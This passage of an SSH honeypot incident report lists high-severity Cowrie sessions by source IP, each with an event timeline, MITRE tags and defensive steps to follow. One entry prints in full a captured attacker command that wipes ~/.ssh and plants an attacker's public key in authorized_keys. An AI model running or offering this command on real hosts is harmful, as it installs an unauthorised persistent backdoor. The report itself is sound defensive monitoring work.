| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 04:57:11` | `cowrie.session.connect` |
| `2026-07-11 04:57:11` | `cowrie.client.version` |
| `2026-07-11 04:57:11` | `cowrie.client.kex` |
| `2026-07-11 04:57:12` | `cowrie.login.success` |
| `2026-07-11 04:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc7d0a80923

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-11 04:57 |
| **Last Seen** | 2026-07-11 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 04:57:11` | `cowrie.session.connect` |
| `2026-07-11 04:57:11` | `cowrie.client.version` |
| `2026-07-11 04:57:11` | `cowrie.client.kex` |
| `2026-07-11 04:57:12` | `cowrie.login.success` |
| `2026-07-11 04:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d08bd949ea58

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]188` |
| **First Seen** | 2026-07-11 04:57 |
| **Last Seen** | 2026-07-11 04:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 04:57:49` | `cowrie.session.connect` |
| `2026-07-11 04:57:50` | `cowrie.client.version` |
| `2026-07-11 04:57:50` | `cowrie.client.kex` |
| `2026-07-11 04:57:52` | `cowrie.login.success` |
| `2026-07-11 04:57:53` | `cowrie.direct-tcpip.request` |
| `2026-07-11 04:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]188` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c81a86dc6b5

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]41` |
| **First Seen** | 2026-07-11 04:57 |
| **Last Seen** | 2026-07-11 04:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 04:57:59` | `cowrie.session.connect` |
| `2026-07-11 04:57:59` | `cowrie.client.version` |
| `2026-07-11 04:57:59` | `cowrie.client.kex` |
| `2026-07-11 04:58:00` | `cowrie.login.success` |
| `2026-07-11 04:58:01` | `cowrie.direct-tcpip.request` |
| `2026-07-11 04:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]41` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33e4b0aa3b7f

| Field | Detail |
|---|---|
| **Source IP** | `177.135.206[.]10` |
| **First Seen** | 2026-07-11 04:58 |
| **Last Seen** | 2026-07-11 04:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 04:58:59` | `cowrie.session.connect` |
| `2026-07-11 04:59:00` | `cowrie.client.version` |
| `2026-07-11 04:59:00` | `cowrie.client.kex` |
| `2026-07-11 04:59:02` | `cowrie.login.success` |
| `2026-07-11 04:59:03` | `cowrie.direct-tcpip.request` |
| `2026-07-11 04:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.135.206[.]10` to AbuseIPDB if not already reported
- [ ] Block `177.135.206[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-122591dfc307

| Field | Detail |
|---|---|
| **Source IP** | `207.219.221[.]101` |
| **First Seen** | 2026-07-11 04:59 |
| **Last Seen** | 2026-07-11 04:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 04:59:12` | `cowrie.session.connect` |
| `2026-07-11 04:59:13` | `cowrie.client.version` |
| `2026-07-11 04:59:13` | `cowrie.client.kex` |
| `2026-07-11 04:59:14` | `cowrie.login.success` |
| `2026-07-11 04:59:14` | `cowrie.direct-tcpip.request` |
| `2026-07-11 04:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `207.219.221[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aac5d7dffdf0

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-07-11 04:59 |
| **Last Seen** | 2026-07-11 04:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 04:59:36` | `cowrie.session.connect` |
| `2026-07-11 04:59:37` | `cowrie.client.version` |
| `2026-07-11 04:59:37` | `cowrie.client.kex` |
| `2026-07-11 04:59:38` | `cowrie.login.success` |
| `2026-07-11 04:59:38` | `cowrie.direct-tcpip.request` |
| `2026-07-11 04:59:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16436f456b27

| Field | Detail |
|---|---|
| **Source IP** | `217.150.37[.]249` |
| **First Seen** | 2026-07-11 04:59 |
| **Last Seen** | 2026-07-11 04:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 04:59:43` | `cowrie.session.connect` |
| `2026-07-11 04:59:44` | `cowrie.client.version` |
| `2026-07-11 04:59:44` | `cowrie.client.kex` |
| `2026-07-11 04:59:45` | `cowrie.login.success` |
| `2026-07-11 04:59:46` | `cowrie.direct-tcpip.request` |
| `2026-07-11 04:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.150.37[.]249` to AbuseIPDB if not already reported
- [ ] Block `217.150.37[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3eba135ffcbe

| Field | Detail |
|---|---|
| **Source IP** | `172.239.71[.]239` |
| **First Seen** | 2026-07-11 04:59 |
| **Last Seen** | 2026-07-11 04:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 04:59:47` | `cowrie.session.connect` |
| `2026-07-11 04:59:47` | `cowrie.login.success` |
| `2026-07-11 04:59:47` | `cowrie.session.params` |
| `2026-07-11 04:59:47` | `cowrie.command.input` |
| `2026-07-11 04:59:47` | `cowrie.command.input` |
| `2026-07-11 04:59:47` | `cowrie.command.failed` |
| `2026-07-11 04:59:47` | `cowrie.command.input` |
| `2026-07-11 04:59:47` | `cowrie.command.failed` |
| `2026-07-11 04:59:47` | `cowrie.command.input` |
| `2026-07-11 04:59:48` | `cowrie.log.closed` |
| `2026-07-11 04:59:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.239.71[.]239` to AbuseIPDB if not already reported
- [ ] Block `172.239.71[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f7ca4ee7da9

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-07-11 05:02 |
| **Last Seen** | 2026-07-11 05:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:02:27` | `cowrie.session.connect` |
| `2026-07-11 05:02:28` | `cowrie.client.version` |
| `2026-07-11 05:02:28` | `cowrie.client.kex` |
| `2026-07-11 05:02:30` | `cowrie.login.success` |
| `2026-07-11 05:02:31` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6b0a57c03fe

| Field | Detail |
|---|---|
| **Source IP** | `179.185.18[.]67` |
| **First Seen** | 2026-07-11 05:02 |
| **Last Seen** | 2026-07-11 05:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:02:36` | `cowrie.session.connect` |
| `2026-07-11 05:02:37` | `cowrie.client.version` |
| `2026-07-11 05:02:37` | `cowrie.client.kex` |
| `2026-07-11 05:02:39` | `cowrie.login.success` |
| `2026-07-11 05:02:39` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.18[.]67` to AbuseIPDB if not already reported
- [ ] Block `179.185.18[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f613bb26b03e

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-07-11 05:03 |
| **Last Seen** | 2026-07-11 05:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:03:07` | `cowrie.session.connect` |
| `2026-07-11 05:03:08` | `cowrie.client.version` |
| `2026-07-11 05:03:08` | `cowrie.client.kex` |
| `2026-07-11 05:03:10` | `cowrie.login.success` |
| `2026-07-11 05:03:10` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70a6ba349c1f

| Field | Detail |
|---|---|
| **Source IP** | `49.124.147[.]105` |
| **First Seen** | 2026-07-11 05:03 |
| **Last Seen** | 2026-07-11 05:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:03:16` | `cowrie.session.connect` |
| `2026-07-11 05:03:17` | `cowrie.client.version` |
| `2026-07-11 05:03:17` | `cowrie.client.kex` |
| `2026-07-11 05:03:19` | `cowrie.login.success` |
| `2026-07-11 05:03:20` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.147[.]105` to AbuseIPDB if not already reported
- [ ] Block `49.124.147[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b76e326dd0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 05:12 |
| **Last Seen** | 2026-07-11 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:12:06` | `cowrie.session.connect` |
| `2026-07-11 05:12:06` | `cowrie.client.version` |
| `2026-07-11 05:12:06` | `cowrie.client.kex` |
| `2026-07-11 05:12:07` | `cowrie.login.success` |
| `2026-07-11 05:12:08` | `cowrie.session.params` |
| `2026-07-11 05:12:08` | `cowrie.command.input` |
| `2026-07-11 05:12:08` | `cowrie.log.closed` |
| `2026-07-11 05:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f3ad186a228

| Field | Detail |
|---|---|
| **Source IP** | `181.233.140[.]250` |
| **First Seen** | 2026-07-11 05:17 |
| **Last Seen** | 2026-07-11 05:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:17:09` | `cowrie.session.connect` |
| `2026-07-11 05:17:09` | `cowrie.client.version` |
| `2026-07-11 05:17:09` | `cowrie.client.kex` |
| `2026-07-11 05:17:11` | `cowrie.login.success` |
| `2026-07-11 05:17:12` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:17:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.233.140[.]250` to AbuseIPDB if not already reported
- [ ] Block `181.233.140[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a21bc41c23c

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-07-11 05:22 |
| **Last Seen** | 2026-07-11 05:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:22:29` | `cowrie.session.connect` |
| `2026-07-11 05:22:30` | `cowrie.client.version` |
| `2026-07-11 05:22:30` | `cowrie.client.kex` |
| `2026-07-11 05:22:32` | `cowrie.login.success` |
| `2026-07-11 05:22:33` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:22:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5614c925ad2c

| Field | Detail |
|---|---|
| **Source IP** | `62.182.132[.]94` |
| **First Seen** | 2026-07-11 05:22 |
| **Last Seen** | 2026-07-11 05:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:22:43` | `cowrie.session.connect` |
| `2026-07-11 05:22:43` | `cowrie.client.version` |
| `2026-07-11 05:22:43` | `cowrie.client.kex` |
| `2026-07-11 05:22:44` | `cowrie.login.success` |
| `2026-07-11 05:22:44` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.182.132[.]94` to AbuseIPDB if not already reported
- [ ] Block `62.182.132[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84698842f150

| Field | Detail |
|---|---|
| **Source IP** | `103.159.54[.]61` |
| **First Seen** | 2026-07-11 05:23 |
| **Last Seen** | 2026-07-11 05:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:23:21` | `cowrie.session.connect` |
| `2026-07-11 05:23:21` | `cowrie.client.version` |
| `2026-07-11 05:23:21` | `cowrie.client.kex` |
| `2026-07-11 05:23:22` | `cowrie.login.success` |
| `2026-07-11 05:23:23` | `cowrie.session.params` |
| `2026-07-11 05:23:23` | `cowrie.command.input` |
| `2026-07-11 05:23:23` | `cowrie.command.failed` |
| `2026-07-11 05:23:24` | `cowrie.log.closed` |
| `2026-07-11 05:23:25` | `cowrie.session.params` |
| `2026-07-11 05:23:25` | `cowrie.command.input` |
| `2026-07-11 05:23:25` | `cowrie.session.file_download` |
| `2026-07-11 05:23:25` | `cowrie.log.closed` |
| `2026-07-11 05:23:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.159.54[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.159.54[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-956e1d6f93fa

| Field | Detail |
|---|---|
| **Source IP** | `103.159.54[.]61` |
| **First Seen** | 2026-07-11 05:23 |
| **Last Seen** | 2026-07-11 05:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:23:25` | `cowrie.session.connect` |
| `2026-07-11 05:23:25` | `cowrie.client.version` |
| `2026-07-11 05:23:25` | `cowrie.client.kex` |
| `2026-07-11 05:23:26` | `cowrie.login.success` |
| `2026-07-11 05:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.159.54[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.159.54[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20ed19bfa81c

| Field | Detail |
|---|---|
| **Source IP** | `103.159.54[.]61` |
| **First Seen** | 2026-07-11 05:23 |
| **Last Seen** | 2026-07-11 05:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:23:27` | `cowrie.session.connect` |
| `2026-07-11 05:23:27` | `cowrie.client.version` |
| `2026-07-11 05:23:27` | `cowrie.client.kex` |
| `2026-07-11 05:23:28` | `cowrie.login.success` |
| `2026-07-11 05:23:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.159.54[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.159.54[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90cb1230e65e

| Field | Detail |
|---|---|
| **Source IP** | `203.198.173[.]137` |
| **First Seen** | 2026-07-11 05:24 |
| **Last Seen** | 2026-07-11 05:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:24:27` | `cowrie.session.connect` |
| `2026-07-11 05:24:28` | `cowrie.client.version` |
| `2026-07-11 05:24:28` | `cowrie.client.kex` |
| `2026-07-11 05:24:30` | `cowrie.login.success` |
| `2026-07-11 05:24:31` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:24:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.198.173[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.198.173[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b197506df57e

| Field | Detail |
|---|---|
| **Source IP** | `83.239.84[.]130` |
| **First Seen** | 2026-07-11 05:24 |
| **Last Seen** | 2026-07-11 05:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:24:59` | `cowrie.session.connect` |
| `2026-07-11 05:24:59` | `cowrie.client.version` |
| `2026-07-11 05:24:59` | `cowrie.client.kex` |
| `2026-07-11 05:25:00` | `cowrie.login.success` |
| `2026-07-11 05:25:01` | `cowrie.direct-tcpip.request` |
| `2026-07-11 05:25:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.84[.]130` to AbuseIPDB if not already reported
- [ ] Block `83.239.84[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d52df36369d6

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 05:25 |
| **Last Seen** | 2026-07-11 05:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:25:42` | `cowrie.session.connect` |
| `2026-07-11 05:25:42` | `cowrie.client.version` |
| `2026-07-11 05:25:42` | `cowrie.client.kex` |
| `2026-07-11 05:25:42` | `cowrie.login.success` |
| `2026-07-11 05:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76f95fa154e5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-11 05:25 |
| **Last Seen** | 2026-07-11 05:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:25:42` | `cowrie.session.connect` |
| `2026-07-11 05:25:42` | `cowrie.client.version` |
| `2026-07-11 05:25:42` | `cowrie.client.kex` |
| `2026-07-11 05:25:42` | `cowrie.login.success` |
| `2026-07-11 05:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd4ef56f8df1

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 05:25 |
| **Last Seen** | 2026-07-11 05:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:25:45` | `cowrie.session.connect` |
| `2026-07-11 05:25:45` | `cowrie.client.version` |
| `2026-07-11 05:25:45` | `cowrie.client.kex` |
| `2026-07-11 05:25:47` | `cowrie.login.success` |
| `2026-07-11 05:25:48` | `cowrie.session.params` |
| `2026-07-11 05:25:48` | `cowrie.command.input` |
| `2026-07-11 05:25:48` | `cowrie.log.closed` |
| `2026-07-11 05:25:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa2708ae967

| Field | Detail |
|---|---|
| **Source IP** | `80.233.12[.]109` |
| **First Seen** | 2026-07-11 05:25 |
| **Last Seen** | 2026-07-11 05:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 05:25:46` | `cowrie.session.connect` |
| `2026-07-11 05:25:46` | `cowrie.client.version` |
| `2026-07-11 05:25:46` | `cowrie.client.kex` |
